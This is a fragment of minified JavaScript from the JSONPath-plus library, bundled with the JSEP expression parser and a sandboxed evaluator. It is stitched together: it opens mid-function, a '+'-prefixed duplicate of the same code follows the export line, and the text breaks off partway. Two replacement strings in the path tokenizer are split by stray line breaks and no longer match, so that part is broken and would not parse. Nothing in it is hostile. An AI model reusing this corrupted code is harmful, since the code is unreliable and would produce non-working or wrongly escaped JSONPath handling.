o=[a[2]],h=a[1]?t[e][a[1]]:t[e];this._trace(o,h,r,s,n,i,!0).length>0&&f(this._trace(u,t[e],l(r,e),t,e,i,!0))})):this._walk(t,(a=>{this._eval(e,t[a],a,r,s,n)&&f(this._trace(u,t[a],l(r,a),t,a,i,!0))}))}else if(\"(\"===p[0]){if(!1===this.currEval)throw new Error(\"Eval [(expr)] prevented in JSONPath expression.\");f(this._trace(c(this._eval(p,t,r.at(-1),r.slice(0,-1),s,n),u),t,r,s,n,i,a))}else if(\"@\"===p[0]){let e=!1;const a=p.slice(1,-2);switch(a){case\"scalar\":t&&[\"object\",\"function\"].includes(typeof t)||(e=!0);break;case\"boolean\":case\"string\":case\"undefined\":case\"function\":typeof t===a&&(e=!0);break;case\"integer\":!Number.isFinite(t)||t%1||(e=!0);break;case\"number\":Number.isFinite(t)&&(e=!0);break;case\"nonFinite\":\"number\"!=typeof t||Number.isFinite(t)||(e=!0);break;case\"object\":t&&typeof t===a&&(e=!0);break;case\"array\":Array.isArray(t)&&(e=!0);break;case\"other\":e=this.currOtherTypeCallback(t,r,s,n);break;case\"null\":null===t&&(e=!0);break;default:throw new TypeError(\"Unknown value type \"+a)}if(e)return h={path:r,value:t,parent:s,parentProperty:n},this._handleCallback(h,i,\"value\"),h}else if(\"`\"===p[0]&&t&&Object.hasOwn(t,p.slice(1))){const e=p.slice(1);f(this._trace(u,t[e],l(r,e),t,e,i,a,!0))}else if(p.includes(\",\")){const e=p.split(\",\");for(const a of e)f(this._trace(c(a,u),t,r,s,n,i,!0))}else!o&&t&&Object.hasOwn(t,p)&&f(this._trace(u,t[p],l(r,p),t,p,i,a,!0))}if(this._hasParentSelector)for(let e=0;e<d.length;e++){const r=d[e];if(r&&r.isParentSelector){const o=this._trace(r.expr,t,r.path,s,n,i,a);if(Array.isArray(o)){d[e]=o[0];const t=o.length;for(let r=1;r<t;r++)e++,d.splice(e,0,o[r])}else d[e]=o}}return d},u.prototype._walk=function(e,t){if(Array.isArray(e)){const r=e.length;for(let e=0;e<r;e++)t(e)}else e&&\"object\"==typeof e&&Object.keys(e).forEach((e=>{t(e)}))},u.prototype._slice=function(e,t,r,s,n,i,a){if(!Array.isArray(r))return;const o=r.length,h=e.split(\":\"),l=h[2]&&Number.parseInt(h[2])||1;let p=h[0]&&Number.parseInt(h[0])||0,u=h[1]&&Number.parseInt(h[1])||o;p=p<0?Math.max(0,p+o):Math.min(o,p),u=u<0?Math.max(0,u+o):Math.min(o,u);const d=[];for(let e=p;e<u;e+=l){this._trace(c(e,t),r,s,n,i,a,!0).forEach((e=>{d.push(e)}))}return d},u.prototype._eval=function(e,t,r,s,n,i){this.currSandbox._$_parentProperty=i,this.currSandbox._$_parent=n,this.currSandbox._$_property=r,this.currSandbox._$_root=this.json,this.currSandbox._$_v=t;const a=e.includes(\"@path\");a&&(this.currSandbox._$_path=u.toPathString(s.concat([r])));const o=this.currEval+\"Script:\"+e;if(!u.cache[o]){let t=e.replaceAll(\"@parentProperty\",\"_$_parentProperty\").replaceAll(\"@parent\",\"_$_parent\").replaceAll(\"@property\",\"_$_property\").replaceAll(\"@root\",\"_$_root\").replaceAll(/@([.\\s)[])/gu,\"_$_v$1\");if(a&&(t=t.replaceAll(\"@path\",\"_$_path\")),\"safe\"===this.currEval||!0===this.currEval||void 0===this.currEval)u.cache[o]=new this.safeVm.Script(t);else if(\"native\"===this.currEval)u.cache[o]=new this.vm.Script(t);else if(\"function\"==typeof this.currEval&&this.currEval.prototype&&Object.hasOwn(this.currEval.prototype,\"runInNewContext\")){const e=this.currEval;u.cache[o]=new e(t)}else{if(\"function\"!=typeof this.currEval)throw new TypeError(`Unknown \"eval\" property \"${this.currEval}\"`);u.cache[o]={runInNewContext:e=>this.currEval(t,e)}}}try{return u.cache[o].runInNewContext(this.currSandbox)}catch(t){if(this.ignoreEvalErrors)return!1;throw new Error(\"jsonPath: \"+t.message+\": \"+e)}},u.cache={},u.toPathString=function(e){const t=e,r=t.length;let s=\"$\";for(let e=1;e<r;e++)/^(~|\\^|@.*?\\(\\))$/u.test(t[e])||(s+=/^[0-9*]+$/u.test(t[e])?\"[\"+t[e]+\"]\":\"['\"+t[e]+\"']\");return s},u.toPointer=function(e){const t=e,r=t.length;let s=\"\";for(let e=1;e<r;e++)/^(~|\\^|@.*?\\(\\))$/u.test(t[e])||(s+=\"/\"+t[e].toString().replaceAll(\"~\",\"~0\").replaceAll(\"/\",\"~1\"));return s},u.toPathArray=function(e){const{cache:t}=u;if(t[e])return t[e].concat();const r=[],s=e.replaceAll(/@(?:null|boolean|number|string|integer|undefined|nonFinite|scalar|array|object|function|other)\\(\\)/gu,\";$&;\").replaceAll(/[['](\\??\\(.*?\\))[\\]'](?!.\\])/gu,(function(e,t){return\"[#\"+(r.push(t)-1)+\"]\"})).replaceAll(/\\[['\"]([^'\\]]*)['\"]\\]/gu,(function(e,t){return\"['\"+t.replaceAll(\".\",\"%@%\").replaceAll(\"~\",\"%%\n\n@@%%\")+\"']\"})).replaceAll(\"~\",\";~;\").replaceAll(/['\"]?\\.['\"]?(?![^[]*\\])|\\[['\"]?/gu,\";\").replaceAll(\"%@%\",\".\").replaceAll(\"%%@@\n%%\",\"~\").replaceAll(/(?:;)?(\\^+)(?:;)?/gu,(function(e,t){return\";\"+t.split(\"\").join(\";\")+\";\"})).replaceAll(/;;;|;;/gu,\";..;\").replaceAll(/;$|'?\\]|'$/gu,\"\").split(\";\").map((function(e){const t=e.match(/#(\\d+)/u);return t&&t[1]?r[t[1]]:e}));return t[e]=s,t[e].concat()},u.prototype.safeVm={Script:class{constructor(e){this.code=e,this.ast=r(this.code)}runInNewContext(e){const t=Object.assign(Object.create(null),e);return h.evalAst(this.ast,t)}}};u.prototype.vm={Script:class{constructor(e){this.code=e}runInNewContext(e){let t=this.code;const r=Object.keys(e),s=[];!function(e,t,r){const s=e.length;for(let n=0;n<s;n++)r(e[n])&&t.push(e.splice(n--,1)[0])}(r,s,(t=>\"function\"==typeof e[t]));const n=r.map((t=>e[t]));t=s.reduce(((t,r)=>{let s=e[r].toString();return/function/u.test(s)||(s=\"function \"+s),\"var \"+r+\"=\"+s+\";\"+t}),\"\")+t,/(['\"])use strict\\1/u.test(t)||r.includes(\"arguments\")||(t=\"var arguments = undefined;\"+t),t=t.replace(/;\\s*$/u,\"\");const i=t.lastIndexOf(\";\"),a=-1!==i?t.slice(0,i+1)+\" return \"+t.slice(i+1):\" return \"+t;return new Function(...r,a)(...n)}}};export{u as JSONPath};\n+class e{static get version(){return\"1.4.0\"}static toString(){return\"JavaScript Expression Parser (JSEP) v\"+e.version}static addUnaryOp(t){return e.max_unop_len=Math.max(t.length,e.max_unop_len),e.unary_ops[t]=1,e}static addBinaryOp(t,r,s){return e.max_binop_len=Math.max(t.length,e.max_binop_len),e.binary_ops[t]=r,s?e.right_associative.add(t):e.right_associative.delete(t),e}static addIdentifierChar(t){return e.additional_identifier_chars.add(t),e}static addLiteral(t,r){return e.literals[t]=r,e}static removeUnaryOp(t){return delete e.unary_ops[t],t.length===e.max_unop_len&&(e.max_unop_len=e.getMaxKeyLen(e.unary_ops)),e}static removeAllUnaryOps(){return e.unary_ops={},e.max_unop_len=0,e}static removeIdentifierChar(t){return e.additional_identifier_chars.delete(t),e}static removeBinaryOp(t){return delete e.binary_ops[t],t.length===e.max_binop_len&&(e.max_binop_len=e.getMaxKeyLen(e.binary_ops)),e.right_associative.delete(t),e}static removeAllBinaryOps(){return e.binary_ops={},e.max_binop_len=0,e}static removeLiteral(t){return delete e.literals[t],e}static removeAllLiterals(){return e.literals={},e}get char(){return this.expr.charAt(this.index)}get code(){return this.expr.charCodeAt(this.index)}constructor(e){this.expr=e,this.index=0}static parse(t){return new e(t).parse()}static getMaxKeyLen(e){return Math.max(0,...Object.keys(e).map((e=>e.length)))}static isDecimalDigit(e){return e>=48&&e<=57}static binaryPrecedence(t){return e.binary_ops[t]||0}static isIdentifierStart(t){return t>=65&&t<=90||t>=97&&t<=122||t>=128&&!e.binary_ops[String.fromCharCode(t)]||e.additional_identifier_chars.has(String.fromCharCode(t))}static isIdentifierPart(t){return e.isIdentifierStart(t)||e.isDecimalDigit(t)}throwError(e){const t=new Error(e+\" at character \"+this.index);throw t.index=this.index,t.description=e,t}runHook(t,r){if(e.hooks[t]){const s={context:this,node:r};return e.hooks.run(t,s),s.node}return r}searchHook(t){if(e.hooks[t]){const r={context:this};return e.hooks[t].find((function(e){return e.call(r.context,r),r.node})),r.node}}gobbleSpaces(){let t=this.code;for(;t===e.SPACE_CODE||t===e.TAB_CODE||t===e.LF_CODE||t===e.CR_CODE;)t=this.expr.charCodeAt(++this.index);this.runHook(\"gobble-spaces\")}parse(){this.runHook(\"before-all\");const t=this.gobbleExpressions(),r=1===t.length?t[0]:{type:e.COMPOUND,body:t};return this.runHook(\"after-all\",r)}gobbleExpressions(t){let r,s,n=[];for(;this.index<this.expr.length;)if(r=this.code,r===e.SEMCOL_CODE||r===e.COMMA_CODE)this.index++;else if(s=this.gobbleExpression())n.push(s);else if(this.index<this.expr.length){if(r===t)break;this.throwError('Unexpected \"'+this.char+'\"')}return n}gobbleExpression(){const e=this.searchHook(\"gobble-expression\")||this.gobbleBinaryExpression();return this.gobbleSpaces(),this.runHook(\"after-expression\",e)}gobbleBinaryOp(){this.gobbleSpaces();let t=this.expr.substr(this.index,e.max_binop_len),r=t.length;for(;r>0;){if(e.binary_ops.hasOwnProperty(t)&&(!e.isIdentifierStart(this.code)||this.index+t.length<this.expr.length&&!e.isIdentifierPart(this.expr.charCodeAt(this.index+t.length))))return this.index+=r,t;t=t.substr(0,--r)}return!1}gobbleBinaryExpression(){let t,r,s,n,i,a,o,h,l;if(a=this.gobbleToken(),!a)return a;if(r=this.gobbleBinaryOp(),!r)return a;for(i={value:r,prec:e.binaryPrecedence(r),right_a:e.right_associative.has(r)},o=this.gobbleToken(),o||this.throwError(\"Expected expression after \"+r),n=[a,i,o];r=this.gobbleBinaryOp();){if(s=e.binaryPrecedence(r),0===s){this.index-=r.length;break}i={value:r,prec:s,right_a:e.right_associative.has(r)},l=r;const h=e=>i.right_a&&e.right_a?s>e.prec:s<=e.prec;for(;n.length>2&&h(n[n.length-2]);)o=n.pop(),r=n.pop().value,a=n.pop(),t={type:e.BINARY_EXP,operator:r,left:a,right:o},n.push(t);t=this.gobbleToken(),t||this.throwError(\"Expected expression after \"+l),n.push(i,t)}for(h=n.length-1,t=n[h];h>1;)t={type:e.BINARY_EXP,operator:n[h-1].value,left:n[h-2],right:t},h-=2;return t}gobbleToken(){let t,r,s,n;if(this.gobbleSpaces(),n=this.searchHook(\"gobble-token\"),n)return this.runHook(\"after-token\",n);if(t=this.code,e.isDecimalDigit(t)||t===e.PERIOD_CODE)return this.gobbleNumericLiteral();if(t===e.SQUOTE_CODE||t===e.DQUOTE_CODE)n=this.gobbleStringLiteral();else if(t===e.OBRACK_CODE)n=this.gobbleArray();else{for(r=this.expr.substr(this.index,e.max_unop_len),s=r.length;s>0;){if(e.unary_ops.hasOwnProperty(r)&&(!e.isIdentifierStart(this.code)||this.index+r.length<this.expr.length&&!e.isIdentifierPart(this.expr.charCodeAt(this.index+r.length)))){this.index+=s;const t=this.gobbleToken();return t||this.throwError(\"missing unaryOp argument\"),this.runHook(\"after-token\",{type:e.UNARY_EXP,operator:r,argument:t,prefix:!0})}r=r.substr(0,--s)}e.isIdentifierStart(t)?(n=this.gobbleIdentifier(),e.literals.hasOwnProperty(n.name)?n={type:e.LITERAL,value:e.literals[n.name],raw:n.name}:n.name===e.this_str&&(n={type:e.THIS_EXP})):t===e.OPAREN_CODE&&(n=this.gobbleGroup())}return n?(n=this.gobbleTokenProperty(n),this.runHook(\"after-token\",n)):this.runHook(\"after-token\",!1)}gobbleTokenProperty(t){this.gobbleSpaces();let r=this.code;for(;r===e.PERIOD_CODE||r===e.OBRACK_CODE||r===e.OPAREN_CODE||r===e.QUMARK_CODE;){let s;if(r===e.QUMARK_CODE){if(this.expr.charCodeAt(this.index+1)!==e.PERIOD_CODE)break;s=!0,this.index+=2,this.gobbleSpaces(),r=this.code}this.index++,r===e.OBRACK_CODE?((t={type:e.MEMBER_EXP,computed:!0,object:t,property:this.gobbleExpression()}).property||this.throwError('Unexpected \"'+this.char+'\"'),this.gobbleSpaces(),r=this.code,r!==e.CBRACK_CODE&&this.throwError(\"Unclosed [\"),this.index++):r===e.OPAREN_CODE?t={type:e.CALL_EXP,arguments:this.gobbleArguments(e.CPAREN_CODE),callee:t}:(r===e.PERIOD_CODE||s)&&(s&&this.index--,this.gobbleSpaces(),t={type:e.MEMBER_EXP,computed:!1,object:t,property:this.gobbleIdentifier()}),s&&(t.optional=!0),this.gobbleSpaces(),r=this.code}return t}gobbleNumericLiteral(){let t,r,s=\"\";for(;e.isDecimalDigit(this.code);)s+=this.expr.charAt(this.index++);if(this.code===e.PERIOD_CODE)for(s+=this.expr.charAt(this.index++);e.isDecimalDigit(this.code);)s+=this.expr.charAt(this.index++);if(t=this.char,\"e\"===t||\"E\"===t){for(s+=this.expr.charAt(this.index++),t=this.char,\"+\"!==t&&\"-\"!==t||(s+=this.expr.charAt(this.index++));e.isDecimalDigit(this.code);)s+=this.expr.charAt(this.index++);e.isDecimalDigit(this.expr.charCodeAt(this.index-1))||this.throwError(\"Expected exponent (\"+s+this.char+\")\")}return r=this.code,e.isIdentifierStart(r)?this.throwError(\"Variable names cannot start with a number (\"+s+this.char+\")\"):(r===e.PERIOD_CODE||1===s.length&&s.charCodeAt(0)===e.PERIOD_CODE)&&this.throwError(\"Unexpected period\"),{type:e.LITERAL,value:parseFloat(s),raw:s}}gobbleStringLiteral(){let t=\"\";const r=this.index,s=this.expr.charAt(this.index++);let n=!1;for(;this.index<this.expr.length;){let e=this.expr.charAt(this.index++);if(e===s){n=!0;break}if(\"\\\\\"===e)switch(e=this.expr.charAt(this.index++),e){case\"n\":t+=\"\\n\";break;case\"r\":t+=\"\\r\";break;case\"t\":t+=\"\\t\";break;case\"b\":t+=\"\\b\";break;case\"f\":t+=\"\\f\";break;case\"v\":t+=\"\\v\";break;default:t+=e}else t+=e}return n||this.throwError('Unclosed quote after \"'+t+'\"'),{type:e.LITERAL,value:t,raw:this.expr.substring(r,this.index)}}gobbleIdentifier(){let t=this.code,r=this.index;for(e.isIdentifierStart(t)?this.index++:this.throwError(\"Unexpected \"+this.char);this.index<this.expr.length&&(t=this.code,e.isIdentifierPart(t));)this.index++;return{type:e.IDENTIFIER,name:this.expr.slice(r,this.index)}}gobbleArguments(t){const r=[];let s=!1,n=0;for(;this.index<this.expr.length;){this.gobbleSpaces();let i=this.code;if(i===t){s=!0,this.index++,t===e.CPAREN_CODE&&n&&n>=r.length&&this.throwError(\"Unexpected token \"+String.fromCharCode(t));break}if(i===e.COMMA_CODE){if(this.index++,n++,n!==r.length)if(t===e.CPAREN_CODE)this.throwError(\"Unexpected token ,\");else if(t===e.CBRACK_CODE)for(let e=r.length;e<n;e++)r.push(null)}else if(r.length!==n&&0!==n)this.throwError(\"Expected comma\");else{const t=this.gobbleExpression();t&&t.type!==e.COMPOUND||this.throwError(\"Expected comma\"),r.push(t)}}return s||this.throwError(\"Expected \"+String.fromCharCode(t)),r}gobbleGroup(){this.index++;let t=this.gobbleExpressions(e.CPAREN_CODE);if(this.code===e.CPAREN_CODE)return this.index++,1===t.length?t[0]:!!t.length&&{type:e.SEQUENCE_EXP,expressions:t};this.throwError(\"Unclosed (\")}gobbleArray(){return this.index++,{type:e.ARRAY_EXP,elements:this.gobbleArguments(e.CBRACK_CODE)}}}const t=new class{add(e,t,r){if(\"string\"!=typeof arguments[0])for(let e in arguments[0])this.add(e,arguments[0][e],arguments[1]);else(Array.isArray(e)?e:[e]).forEach((function(e){this[e]=this[e]||[],t&&this[e][r?\"unshift\":\"push\"](t)}),this)}run(e,t){this[e]=this[e]||[],this[e].forEach((function(e){e.call(t&&t.context?t.context:t,t)}))}};Object.assign(e,{hooks:t,plugins:new class{constructor(e){this.jsep=e,this.registered={}}register(){for(var e=arguments.length,t=new Array(e),r=0;r<e;r++)t[r]=arguments[r];t.forEach((e=>{if(\"object\"!=typeof e||!e.name||!e.init)throw new Error(\"Invalid JSEP plugin format\");this.registered[e.name]||(e.init(this.jsep),this.registered[e.name]=e)}))}}(e),COMPOUND:\"Compound\",SEQUENCE_EXP:\"SequenceExpression\",IDENTIFIER:\"Identifier\",MEMBER_EXP:\"MemberExpression\",LITERAL:\"Literal\",THIS_EXP:\"ThisExpression\",CALL_EXP:\"CallExpression\",UNARY_EXP:\"UnaryExpression\",BINARY_EXP:\"BinaryExpression\",ARRAY_EXP:\"ArrayExpression\",TAB_CODE:9,LF_CODE:10,CR_CODE:13,SPACE_CODE:32,PERIOD_CODE:46,COMMA_CODE:44,SQUOTE_CODE:39,DQUOTE_CODE:34,OPAREN_CODE:40,CPAREN_CODE:41,OBRACK_CODE:91,CBRACK_CODE:93,QUMARK_CODE:63,SEMCOL_CODE:59,COLON_CODE:58,unary_ops:{\"-\":1,\"!\":1,\"~\":1,\"+\":1},binary_ops:{\"||\":1,\"??\":1,\"&&\":2,\"|\":3,\"^\":4,\"&\":5,\"==\":6,\"!=\":6,\"===\":6,\"!==\":6,\"<\":7,\">\":7,\"<=\":7,\">=\":7,\"<<\":8,\">>\":8,\">>>\":8,\"+\":9,\"-\":9,\"*\":10,\"/\":10,\"%\":10,\"**\":11},right_associative:new Set([\"**\"]),additional_identifier_chars:new Set([\"$\",\"_\"]),literals:{true:!0,false:!1,null:null},this_str:\"this\"}),e.max_unop_len=e.getMaxKeyLen(e.unary_ops),e.max_binop_len=e.getMaxKeyLen(e.binary_ops);const r=t=>new e(t).parse(),s=Object.getOwnPropertyNames(class{});Object.getOwnPropertyNames(e).filter((e=>!s.includes(e)&&void 0===r[e])).forEach((t=>{r[t]=e[t]})),r.Jsep=e;var n={name:\"ternary\",init(e){e.hooks.add(\"after-expression\",(function(t){if(t.node&&this.code===e.QUMARK_CODE){this.index++;const r=t.node,s=this.gobbleExpression();if(s||this.throwError(\"Expected expression\"),this.gobbleSpaces(),this.code===e.COLON_CODE){this.index++;const n=this.gobbleExpression();if(n||this.throwError(\"Expected expression\"),t.node={type:\"ConditionalExpression\",test:r,consequent:s,alternate:n},r.operator&&e.binary_ops[r.operator]<=.9){let s=r;for(;s.right.operator&&e.binary_ops[s.right.operator]<=.9;)s=s.right;t.node.test=s.right,s.right=t.node,t.node=r}}else this.throwError(\"Expected :\")}}))}};r.plugins.register(n);var i={name:\"regex\",init(e){e.hooks.add(\"gobble-token\",(function(t){if(47===this.code){const r=++this.index;let s=!1;for(;this.index<this.expr.length;){if(47===this.code&&!s){const s=this.expr.slice(r,this.index);let n,i=\"\";for(;++this.index<this.expr.length;){const e=this.code;if(!(e>=97&&e<=122||e>=65&&e<=90||e>=48&&e<=57))break;i+=this.char}try{n=new RegExp(s,i)}catch(e){this.throwError(e.message)}return t.node={type:e.LITERAL,value:n,raw:this.expr.slice(r-1,this.index)},t.node=this.gobbleTokenProperty(t.node),t.node}this.code===e.OBRACK_CODE?s=!0:s&&this.code===e.CBRACK_CODE&&(s=!1),this.index+=92===this.code?2:1}this.throwError(\"Unclosed Regex\")}}))}};const a={name:\"assignment\",assignmentOperators:new Set([\"=\",\"*=\",\"**=\",\"/=\",\"%=\",\"+=\",\"-=\",\"<<=\",\">>=\",\">>>=\",\"&=\",\"^=\",\"|=\",\"||=\",\"&&=\",\"??=\"]),updateOperators:[43,45],assignmentPrecedence:.9,init(e){const t=[e.IDENTIFIER,e.MEMBER_EXP];function r(e){a.assignmentOperators.has(e.operator)?(e.type=\"AssignmentExpression\",r(e.left),r(e.right)):e.operator||Object.values(e).forEach((e=>{e&&\"object\"==typeof e&&r(e)}))}a.assignmentOperators.forEach((t=>e.addBinaryOp(t,a.assignmentPrecedence,!0))),e.hooks.add(\"gobble-token\",(function(e){const r=this.code;a.updateOperators.some((e=>e===r&&e===this.expr.charCodeAt(this.index+1)))&&(this.index+=2,e.node={type:\"UpdateExpression\",operator:43===r?\"++\":\"--\",argument:this.gobbleTokenProperty(this.gobbleIdentifier()),prefix:!0},e.node.argument&&t.includes(e.node.argument.type)||this.throwError(`Unexpected ${e.node.operator}`))})),e.hooks.add(\"after-token\",(function(e){if(e.node){const r=this.code;a.updateOperators.some((e=>e===r&&e===this.expr.charCodeAt(this.index+1)))&&(t.includes(e.node.type)||this.throwError(`Unexpected ${e.node.operator}`),this.index+=2,e.node={type:\"UpdateExpression\",operator:43===r?\"++\":\"--\",argument:e.node,prefix:!1})}})),e.hooks.add(\"after-expression\",(function(e){e.node&&r(e.node)}))}};r.plugins.register(i,a),r.addUnaryOp(\"typeof\"),r.addLiteral(\"null\",null),r.addLiteral(\"undefined\",void 0);const o=new Set([\"constructor\",\"__proto__\",\"__defineGetter__\",\"__defineSetter__\"]),h={evalAst(e,t){switch(e.type){case\"BinaryExpression\":case\"LogicalExpression\":return h.evalBinaryExpression(e,t);case\"Compound\":return h.evalCompound(e,t);case\"ConditionalExpression\":return h.evalConditionalExpression(e,t);case\"Identifier\":return h.evalIdentifier(e,t);case\"Literal\":return h.evalLiteral(e,t);case\"MemberExpression\":return h.evalMemberExpression(e,t);case\"UnaryExpression\":return h.evalUnaryExpression(e,t);case\"ArrayExpression\":return h.evalArrayExpression(e,t);case\"CallExpression\":return h.evalCallExpression(e,t);case\"AssignmentExpression\":return h.evalAssignmentExpression(e,t);default:throw SyntaxError(\"Unexpected expression\",e)}},evalBinaryExpression:(e,t)=>({\"||\":(e,t)=>e||t(),\"&&\":(e,t)=>e&&t(),\"|\":(e,t)=>e|t(),\"^\":(e,t)=>e^t(),\"&\":(e,t)=>e&t(),\"==\":(e,t)=>e==t(),\"!=\":(e,t)=>e!=t(),\"===\":(e,t)=>e===t(),\"!==\":(e,t)=>e!==t(),\"<\":(e,t)=>e<t(),\">\":(e,t)=>e>t(),\"<=\":(e,t)=>e<=t(),\">=\":(e,t)=>e>=t(),\"<<\":(e,t)=>e<<t(),\">>\":(e,t)=>e>>t(),\">>>\":(e,t)=>e>>>t(),\"+\":(e,t)=>e+t(),\"-\":(e,t)=>e-t(),\"*\":(e,t)=>e*t(),\"/\":(e,t)=>e/t(),\"%\":(e,t)=>e%t()}[e.operator](h.evalAst(e.left,t),(()=>h.evalAst(e.right,t)))),evalCompound(e,t){let r;for(let s=0;s<e.body.length;s++){\"Identifier\"===e.body[s].type&&[\"var\",\"let\",\"const\"].includes(e.body[s].name)&&e.body[s+1]&&\"AssignmentExpression\"===e.body[s+1].type&&(s+=1);const n=e.body[s];r=h.evalAst(n,t)}return r},evalConditionalExpression:(e,t)=>h.evalAst(e.test,t)?h.evalAst(e.consequent,t):h.evalAst(e.alternate,t),evalIdentifier(e,t){if(Object.hasOwn(t,e.name))return t[e.name];throw ReferenceError(`${e.name} is not defined`)},evalLiteral:e=>e.value,evalMemberExpression(e,t){const r=String(e.computed?h.evalAst(e.property):e.property.name),s=h.evalAst(e.object,t);if(null==s)throw TypeError(`Cannot read properties of ${s} (reading '${r}')`);if(!Object.hasOwn(s,r)&&o.has(r))throw TypeError(`Cannot read properties of ${s} (reading '${r}')`);const n=s[r];return\"function\"==typeof n?n.bind(s):n},evalUnaryExpression:(e,t)=>({\"-\":e=>-h.evalAst(e,t),\"!\":e=>!h.evalAst(e,t),\"~\":e=>~h.evalAst(e,t),\"+\":e=>+h.evalAst(e,t),typeof:e=>typeof h.evalAst(e,t)}[e.operator](e.argument)),evalArrayExpression:(e,t)=>e.elements.map((e=>h.evalAst(e,t))),evalCallExpression(e,t){const r=e.arguments.map((e=>h.evalAst(e,t)));return h.evalAst(e.callee,t)(...r)},evalAssignmentExpression(e,t){if(\"Identifier\"!==e.left.type)throw SyntaxError(\"Invalid left-hand side in assignment\");const r=e.left.name,s=h.evalAst(e.right,t);return t[r]=s,t[r]}};function l(e,t){return(e=e.slice()).push(t),e}function c(e,t){return(t=t.slice()).unshift(e),t}class p extends Error{constructor(e){super('JSONPath should not be called with \"new\" (it prevents return of (unwrapped) scalar values)'),this.avoidNew=!0,this.value=e,this.name=\"NewError\"}}function u(e,t,r,s,n){if(!(this instanceof u))try{return new u(e,t,r,s,n)}catch(e){if(!e.avoidNew)throw e;return e.value}\"string\"==typeof e&&(n=s,s=r,r=t,t=e,e=null);const i=e&&\"object\"==typeof e;if(e=e||{},this.json=e.json||r,this.path=e.path||t,this.resultType=e.resultType||\"value\",this.flatten=e.flatten||!1,this.wrap=!Object.hasOwn(e,\"wrap\")||e.wrap,this.sandbox=e.sandbox||{},this.eval=void 0===e.eval?\"safe\":e.eval,this.ignoreEvalErrors=void 0!==e.ignoreEvalErrors&&e.ignoreEvalErrors,this.parent=e.parent||null,this.parentProperty=e.parentProperty||null,this.callback=e.callback||s||null,this.otherTypeCallback=e.otherTypeCallback||n||function(){throw new TypeError(\"You must supply an otherTypeCallback callback option with the @other() operator.\")},!1!==e.autostart){const s={path:i?e.path:t};i?\"json\"in e&&(s.json=e.json):s.json=r;const n=this.evaluate(s);if(!n||\"object\"!=typeof n)throw new p(n);return n}}u.prototype.evaluate=function(e,t,r,s){let n=this.parent,i=this.parentProperty,{flatten:a,wrap:o}=this;if(this.currResultType=this.resultType,this.currEval=this.eval,this.currSandbox=this.sandbox,r=r||this.callback,this.currOtherTypeCallback=s||this.otherTypeCallback,t=t||this.json,(e=e||this.path)&&\"object\"==typeof e&&!Array.isArray(e)){if(!e.path&&\"\"!==e.path)throw new TypeError('You must supply a \"path\" property when providing an object argument to JSONPath.evaluate().');if(!Object.hasOwn(e,\"json\"))throw new TypeError('You must supply a \"json\" property when providing an object argument to JSONPath.evaluate().');({json:t}=e),a=Object.hasOwn(e,\"flatten\")?e.flatten:a,this.currResultType=Object.hasOwn(e,\"resultType\")?e.resultType:this.currResultType,this.currSandbox=Object.hasOwn(e,\"sandbox\")?e.sandbox:this.currSandbox,o=Object.hasOwn(e,\"wrap\")?e.wrap:o,this.currEval=Object.hasOwn(e,\"eval\")?e.eval:this.currEval,r=Object.hasOwn(e,\"callback\")?e.callback:r,this.currOtherTypeCallback=Object.hasOwn(e,\"otherTypeCallback\")?e.otherTypeCallback:this.currOtherTypeCallback,n=Object.hasOwn(e,\"parent\")?e.parent:n,i=Object.hasOwn(e,\"parentProperty\")?e.parentProperty:i,e=e.path}if(n=n||null,i=i||null,Array.isArray(e)&&(e=u.toPathString(e)),!e&&\"\"!==e||!t)return;const h=u.toPathArray(e);\"$\"===h[0]&&h.length>1&&h.shift(),this._hasParentSelector=null;const l=this._trace(h,t,[\"$\"],n,i,r).filter((function(e){return e&&!e.isParentSelector}));return l.length?o||1!==l.length||l[0].hasArrExpr?l.reduce(((e,t)=>{const r=this._getPreferredOutput(t);return a&&Array.isArray(r)?e=e.concat(r):e.push(r),e}),[]):this._getPreferredOutput(l[0]):o?[]:void 0},u.prototype._getPreferredOutput=function(e){const t=this.currResultType;switch(t){case\"all\":{const t=Array.isArray(e.path)?e.path:u.toPathArray(e.path);return e.pointer=u.toPointer(t),e.path=\"string\"==typeof e.path?e.path:u.toPathString(e.path),e}case\"value\":case\"parent\":case\"parentProperty\":return e[t];case\"path\":return u.toPathString(e[t]);case\"pointer\":return u.toPointer(e.path);default:throw new TypeError(\"Unknown result type\")}},u.prototype._handleCallback=function(e,t,r){if(t){const s=this._getPreferredOutput(e);e.path=\"string\"==typeof e.path?e.path:u.toPathString(e.path),t(s,r,e)}},u.prototype._trace=function(e,t,r,s,n,i,a,o){let h;if(!e.length)return h={path:r,value:t,parent:s,parentProperty:n,hasArrExpr:a},this._handleCallback(h,i,\"value\"),h;const p=e[0],u=e.slice(1),d=[];function f(e){Array.isArray(e)?e.forEach((e=>{d.push(e)})):d.push(e)}if((\"string\"!=typeof p||o)&&t&&Object.hasOwn(t,p))f(this._trace(u,t[p],l(r,p),t,p,i,a));else if(\"*\"===p)this._walk(t,(e=>{f(this._trace(u,t[e],l(r,e),t,e,i,!0,!0))}));else if(\"..\"===p)f(this._trace(u,t,r,s,n,i,a)),this._walk(t,(s=>{\"object\"==typeof t[s]&&f(this._trace(e.slice(),t[s],l(r,s),t,s,i,!0))}));else{if(\"^\"===p)return this._hasParentSelector=!0,{path:r.slice(0,-1),expr:u,isParentSelector:!0};if(\"~\"===p)return h={path:l(r,p),value:n,parent:s,parentProperty:null},this._handleCallback(h,i,\"property\"),h;if(\"$\"===p)f(this._trace(u,t,r,null,null,i,a));else if(/^(-?\\d*):(-?\\d*):?(\\d*)$/u.test(p))f(this._slice(p,u,t,r,s,n,i));else if(0===p.indexOf(\"?(\")){if(!1===this.currEval)throw new Error(\"Eval [?(expr)] prevented in JSONPath expression.\");const e=p.replace(/^\\?\\((.*?)\\)$/u,\"$1\"),a=/@.?([^?]*)[['](\\??\\(.*?\\))(?!.\\)\\])[\\]']/gu.exec(e);a?this._walk(t,(e=>{const o=[a[2]],h=a[1]?t[e][a[1]]:t[e];this._trace(o,h,r,s,n,i,!0).length>0&&f(this._trace(u,t[e],l(r,e),t,e,i,!0))})):this._walk(t,(a=>{this._eval(e,t[a],a,r,s,n)&&f(this._trace(u,t[a],l(r,a),t,a,i,!0))}))}else if(\"(\"===p[0]){if(!1===this.currEval)throw new Error(\"Eval [(expr)] prevented in JSONPath expression.\");f(this._trace(c(this._eval(p,t,r.at(-1),r.slice(0,-1),s,n),u),t,r,s,n,i,a))}else if(\"@\"===p[0]){let e=!1;const a=p.slice(1,-2);switch(a){case\"scalar\":t&&[\"object\",\"function\"].includes(typeof t)||(e=!0);break;case\"boolean\":case\"string\":case\"undefined\":case\"function\":typeof 